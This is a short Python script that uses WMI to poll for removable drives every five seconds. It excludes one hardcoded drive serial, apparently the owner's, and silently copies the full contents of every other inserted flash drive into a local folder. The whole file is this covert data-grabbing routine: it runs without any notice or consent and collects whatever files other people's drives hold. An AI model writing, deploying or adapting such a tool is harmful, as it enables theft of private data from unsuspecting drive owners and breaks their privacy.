import wmi
import os
import time
import shutil
c = wmi.WMI()

class Reader:
    check = True

    @staticmethod
    def create_folder(path):
        if not os.path.isdir(path):
            os.mkdir(path)

    @classmethod
    def wait_falsh(cls):
        for disk in c.Win32_LogicalDisk():
            if disk.Description == "Съемный диск" and disk.VolumeSerialNumber != "7430A10A":
                cls.create_folder('folder')
                folder_name = f"folder\{disk.VolumeSerialNumber}_{disk.VolumeName}"
                cls.create_folder(folder_name)
                cls.download_files(disk.DeviceID, folder_name)
    
    @classmethod
    def download_files(cls, disk_id, folder_name):
        dir = os.listdir(disk_id)
        zero = (0, 1)[True if 'System Volume Information' in dir else False]
        for i in range(zero, len(dir)):
            try:
                shutil.copy2(f"{disk_id}\{dir[i]}", f'{folder_name}')
            except:
                cls.create_folder(f"{folder_name}\{dir[i]}")
                cls.download_files(f"{disk_id}\{dir[i]}", f"{folder_name}\{dir[i]}")

def main():
    classobject = Reader()
    while classobject.check:
        classobject.wait_falsh()
        time.sleep(5)

if __name__ == "__main__":
    main()